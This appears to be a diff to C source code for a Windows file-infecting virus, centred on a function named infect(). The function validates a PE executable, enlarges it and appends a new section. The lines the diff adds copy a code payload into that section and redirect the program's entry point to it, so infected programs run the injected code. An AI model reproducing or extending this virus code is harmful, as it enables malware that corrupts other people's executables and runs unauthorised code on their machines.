@@ -2,10 +2,8 @@
 
 int infect(const char* filename, data_t* data) {
   file_view_t fileView;
-  IMAGE_NT_HEADERS* ntHeaders = NULL;
-  IMAGE_SECTION_HEADER* sectionHeader = NULL;
 
-  printf("infecting %s\n", filename);
+  PRINT_DEBUG("infecting %s\n", filename);
 
   memzero(&fileView, sizeof(file_view_t));
 
@@ -13,18 +11,14 @@ int infect(const char* filename, data_t* data) {
     return 1;
   }
 
-  if (!VERIFY_MZ(fileView.startAddress)) {
-    close_file_view(&fileView, data);
-    return 2;
-  }
-  ntHeaders = get_nt_header(fileView.startAddress);
-
-  if (!VERIFY_MAGIC(&ntHeaders->OptionalHeader.Magic)) {
+  if (!IS_PE(fileView.startAddress)) {
     close_file_view(&fileView, data);
     return 2;
   }
 
-  printf("src size: %lu B\n", fileView.size);
+  PRINT_DEBUG("src size: %lu B\n", fileView.size);
+
+  IMAGE_NT_HEADERS* ntHeaders = get_nt_header(fileView.startAddress);
 
   uint32_t extendedSize = fileView.size + ntHeaders->OptionalHeader.FileAlignment + ALIGN_VALUE(data->codeSize, ntHeaders->OptionalHeader.FileAlignment);
   close_file_view(&fileView, data);
@@ -34,11 +28,11 @@ int infect(const char* filename, data_t* data) {
     return 1;
   }
 
-  printf("ext size: %lu B\n", fileView.size);
+  PRINT_DEBUG("ext size: %lu B\n", fileView.size);
 
   ntHeaders = get_nt_header(fileView.startAddress);
 
-  sectionHeader = (IMAGE_SECTION_HEADER*) (ntHeaders + 1);
+  IMAGE_SECTION_HEADER* sectionHeader = (IMAGE_SECTION_HEADER*) (ntHeaders + 1);
   sectionHeader += ntHeaders->FileHeader.NumberOfSections;
 
   if (!is_section_header_empty(sectionHeader)) {
@@ -52,6 +46,10 @@ int infect(const char* filename, data_t* data) {
   ntHeaders->OptionalHeader.SizeOfImage += extendedSize;
 
   create_section_header(sectionHeader, ntHeaders, data);
+
+  memcp(data->codeAddress, (uint8_t*)fileView.startAddress + sectionHeader->PointerToRawData, data->codeSize);
+
+  ntHeaders->OptionalHeader.AddressOfEntryPoint = sectionHeader->VirtualAddress;
 
   data->functions.flushViewOfFile(fileView.startAddress, extendedSize);
   close_file_view(&fileView, data);
